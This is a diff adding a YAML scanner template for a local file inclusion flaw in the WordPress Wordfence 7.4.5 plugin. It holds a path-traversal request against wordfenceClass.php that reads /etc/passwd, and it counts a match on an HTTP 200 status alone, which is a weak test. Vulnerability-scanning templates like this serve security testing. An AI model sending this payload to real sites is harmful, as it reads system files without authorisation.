@@ -1,0 +1,22 @@
+id: wordpress-wordfence-lfi
+brief:
+    title: WordPress Wordfence 7.4.5 - Local File Inclusion
+    by: 0x_Akoko
+    level: high
+    about: WordPress Wordfence 7.4.5 is vulnerable to local file inclusion.
+    label:
+        - wordpress
+        - wp-plugin
+        - lfi
+        - wordfence
+        - edb
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/wp-content/plugins/wordfence/lib/wordfenceClass.php?file=/../../../../../../etc/passwd'
+      signs:
+        - "on": status
+          status:
+            - 200
